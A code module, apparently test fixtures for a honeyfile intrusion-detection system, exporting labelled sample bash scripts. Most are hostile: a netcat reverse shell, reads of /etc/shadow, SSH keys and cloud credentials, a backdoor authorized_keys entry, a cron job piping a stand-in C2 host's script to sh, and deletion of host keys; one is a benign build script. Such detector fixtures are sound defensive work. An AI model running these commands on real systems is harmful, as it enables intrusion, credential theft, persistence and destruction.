export const SAMPLE_MALICIOUS_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Malicious Deployment Script
# Simulates unauthorized remote access and credential theft
# ==========================================================

echo "[*] Initializing background deployment service..."

# 1. Spawn unauthorized reverse shell listener
nc 10.10.14.1 4444 -e /bin/bash &
PID=$!
echo "[+] Background daemon spawned on PID: $PID"

# 2. Exfiltrate shadow credentials to temporary storage
echo "[*] Harvesting system credentials..."
cat /etc/shadow > /tmp/.system_creds_dump.txt 2>/dev/null

# 3. Modify system hosts
echo "192.168.1.100 updates.internal.corp" >> /etc/hosts 2>/dev/null

echo "[+] Operation completed successfully."
`;

export const SAMPLE_HONEYPOT_TRAP_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Credential Harvesting & Secret Stealer
# Triggers the 🍯 HoneyFile Trap System by touching decoy files
# ==========================================================

echo "[*] Scanning filesystem for credentials and cloud secrets..."

# 1. Harvest SSH private keys and known hosts (MITRE T1552.004)
echo "[*] Dumping SSH credentials..."
cat /root/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_ed25519 2>/dev/null
cat /root/.ssh/known_hosts 2>/dev/null

# 2. Steal Cloud & Infrastructure Tokens (MITRE T1552.001)
echo "[*] Checking AWS & Kubernetes configs..."
cat /root/.aws/credentials 2>/dev/null
cat /root/.kube/config 2>/dev/null
cat /root/.vault-token 2>/dev/null

# 3. Harvest password hashes & alter application secrets
echo "[*] Reading password hashes..."
cat /etc/shadow 2>/dev/null

echo "[*] Injecting backdoor into environment config..."
echo "EXFIL_SERVER=http://evil.internal.attacker:8080" >> /root/.env 2>/dev/null

echo "[+] Credential sweep completed."
`;

export const SAMPLE_SSH_CLOUD_STEALER_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] SSH & Cloud Secret Exfiltration
# Accesses high-priority Tier 1 decoy credentials
# ==========================================================

echo "[*] Harvesting high-value targets..."
cat /root/.ssh/id_rsa 2>/dev/null
cat /root/.aws/credentials 2>/dev/null
cat /root/.kube/config 2>/dev/null
cat /etc/ssl/private/server.key 2>/dev/null

echo "[+] Secret extraction complete."
`;

export const SAMPLE_TAMPER_MODIFY_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Config Tamper & Backdoor Injection
# Triggers SHA-256 hash mismatch by altering honey files
# ==========================================================

echo "[*] Tampering with system configurations..."
echo "C2_CALLBACK=http://attacker.c2.network:443" >> /root/.env 2>/dev/null
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBackdoorKey backdoor@bot" >> /root/.ssh/authorized_keys 2>/dev/null
echo "* * * * * curl -s http://attacker.c2.network/agent.sh | sh" >> /etc/crontabs/root 2>/dev/null

echo "[+] Backdoor injected into configurations."
`;

export const SAMPLE_WIPE_RANSOM_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Ransomware & Host Key Deletion
# Reads shadow file and deletes SSH host keys and tokens
# ==========================================================

echo "[*] Exfiltrating password hashes..."
cat /etc/shadow 2>/dev/null

echo "[*] Wiping host security credentials..."
rm -f /etc/ssh/ssh_host_rsa_key 2>/dev/null
rm -f /root/.vault-token 2>/dev/null
rm -f /root/.git-credentials 2>/dev/null

echo "[+] Wipe routine completed."
`;

export const SAMPLE_BENIGN_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Benign Release & Build Routine
# Simulates safe asset compilation and archive bundling
# ==========================================================

set -e

echo "[*] Initializing clean build workspace..."
mkdir -p ./dist/assets ./dist/bin

echo "[*] Writing build manifest and compilation timestamp..."
echo "Build Version: 2.4.0" > ./dist/manifest.json
echo "Build Timestamp: $(date -u)" >> ./dist/manifest.json

echo "[*] Packaging release bundle archive..."
tar -czf ./dist/release-v2.4.0.tar.gz ./dist/manifest.json

echo "[+] Build completed cleanly. Release ready in ./dist/"
`;
